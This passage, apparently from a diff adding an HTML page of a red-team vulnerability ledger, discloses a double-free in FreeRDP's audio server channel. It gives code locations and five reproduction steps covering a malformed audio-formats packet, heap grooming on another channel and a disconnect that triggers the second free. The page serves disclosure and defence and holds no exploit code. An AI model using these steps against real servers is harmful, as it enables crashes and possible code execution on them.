reerdp.c%3A105%2C%20mf_peer.c%3A231%2C%20wf_peer.c%3A84%29%2C%20the%20same%20pointer%20is%20freed%20twice.%20The%20attacker%20controls%20both%20the%20size%20of%20the%20allocation%20%28via%20wNumberOfFormats%29%20and%20the%20timing%20between%20the%20two%20frees%20%28via%20disconnect%29%2C%20enabling%20allocator-metadata%20corruption.%22%2C%22title%22%3A%22Audio%20server%20double-free%20of%20client%20format%20list%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-ZPF40VKS&#34;,
+  &#34;bug_class&#34;: &#34;Double Free&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-04-16T01:52:39+00:00&#34;,
+  &#34;description&#34;: &#34;In rdpsnd_server_recv_formats(), the server allocates context-&gt;client_formats and then parses each client audio format; if a format&#39;s cbSize exceeds remaining stream bytes, Stream_SafeSeek() fails and control jumps to out_free, which frees context-&gt;client_formats but leaves the pointer and num_client_formats intact. The dangling pointer persists through rdpsnd_server_stop()/reset, and when the session is torn down rdpsnd_server_context_free() (line ~1143) unconditionally frees it a second time. In the shadow server, rdpsnd-&gt;rdpcontext is never assigned so setChannelError is skipped and the main client loop keeps servicing other virtual channels after the first free, giving an authenticated attacker a grooming window to reclaim the chunk before triggering the second free on disconnect. The result is at minimum a reliable remote DoS (glibc double-free abort) and, with heap grooming, a heap-corruption primitive that may lead to code execution in the server.&#34;,
+  &#34;discovered_at&#34;: &#34;2026-04-02T00:00:00+00:00&#34;,
+  &#34;location&#34;: &#34;channels/rdpsnd/server/rdpsnd_main.c:263&#34;,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;freerdp/freerdp&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Authenticate to the FreeRDP shadow/proxy/sample server and join the RDPSND channel&#34;,
+    &#34;2. In response to the server&#39;s SNDC_FORMATS, send a Client Audio Formats PDU where one format&#39;s cbSize (e.g. 0xFFFF) exceeds remaining stream bytes&#34;,
+    &#34;3. Stream_SafeSeek() fails; out_free frees context-&gt;client_formats (size wNumberOfFormats * sizeof(AUDIO_FORMAT)) without NULLing it&#34;,
+    &#34;4. Send crafted PDUs on another virtual channel sized to reclaim the freed chunk with attacker-controlled data&#34;,
+    &#34;5. Disconnect; session teardown calls rdpsnd_server_context_free(), which frees the reclaimed chunk a second time&#34;
+  ],
+  &#34;technical_details&#34;: &#34;The out_free label at rdpsnd_main.c:263 calls free(context-&gt;client_formats) without setting the pointer to NULL or clearing num_client_formats; nothing else on the error/stop/reset path clears it either. Because rdpsnd_server_context_free() at line ~1143 unconditionally calls free(context-&gt;client_formats) during teardown (reached from shadow_client.c:2932, sfreerdp.c:105, mf_peer.c:231, wf_peer.c:84), the same pointer is freed twice. The attacker controls both the size of the allocation (via wNumberOfFormats) and the timing between the two frees (via disconnect), enabling allocator-metadata corruption.&#34;,
+  &#34;title&#34;: &#34;Audio server double-free of client format list&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
